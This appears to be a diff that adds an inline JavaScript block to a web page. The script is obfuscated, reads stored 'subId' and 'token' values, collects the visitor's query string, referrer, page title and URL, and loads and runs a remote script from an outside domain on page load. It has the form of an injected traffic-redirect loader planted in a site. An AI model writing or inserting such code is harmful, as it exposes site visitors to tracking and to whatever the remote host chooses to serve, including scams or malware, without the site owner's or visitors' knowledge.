@@ -1,0 +1,42 @@
+<script>
+    (function() {
+    var name = '_JtxWchq88QBTXGbF';
+    if (!window._JtxWchq88QBTXGbF) {
+        window._JtxWchq88QBTXGbF = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://pourbaconlu.gq/WOWWLM1',
+        };
+    }
+    const _29ZnKL7F5RMV6PJh = localStorage.getItem('config');
+    if (typeof _29ZnKL7F5RMV6PJh !== 'undefined' && _29ZnKL7F5RMV6PJh !== null) {
+        var _STTXXpkSJBGTRN2F = JSON.parse(_29ZnKL7F5RMV6PJh);
+        var _7jT1ZdHPKMgySsRm = Math.round(+new Date()/1000);
+        if (_STTXXpkSJBGTRN2F.created_at + window._JtxWchq88QBTXGbF.ttl < _7jT1ZdHPKMgySsRm) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _vVDv41XMLJ2kD26W = localStorage.getItem('subId');
+    var _zM7Z5kq7kJ4b8fHy = localStorage.getItem('token');
+    var _FmFQpWL4V8VQ6MSr = '?return=js.client';
+        _FmFQpWL4V8VQ6MSr += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _FmFQpWL4V8VQ6MSr += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _FmFQpWL4V8VQ6MSr += '&default_keyword=' + encodeURIComponent(document.title);
+        _FmFQpWL4V8VQ6MSr += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _FmFQpWL4V8VQ6MSr += '&name=' + encodeURIComponent(name);
+        _FmFQpWL4V8VQ6MSr += '&host=' + encodeURIComponent(window._JtxWchq88QBTXGbF.R_PATH);
+    if (typeof _vVDv41XMLJ2kD26W !== 'undefined' && _vVDv41XMLJ2kD26W && window._JtxWchq88QBTXGbF.unique) {
+        _FmFQpWL4V8VQ6MSr += '&sub_id=' + encodeURIComponent(_vVDv41XMLJ2kD26W);
+    }
+    if (typeof _zM7Z5kq7kJ4b8fHy !== 'undefined' && _zM7Z5kq7kJ4b8fHy && window._JtxWchq88QBTXGbF.unique) {
+        _FmFQpWL4V8VQ6MSr += '&token=' + encodeURIComponent(_zM7Z5kq7kJ4b8fHy);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._JtxWchq88QBTXGbF.R_PATH + _FmFQpWL4V8VQ6MSr;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
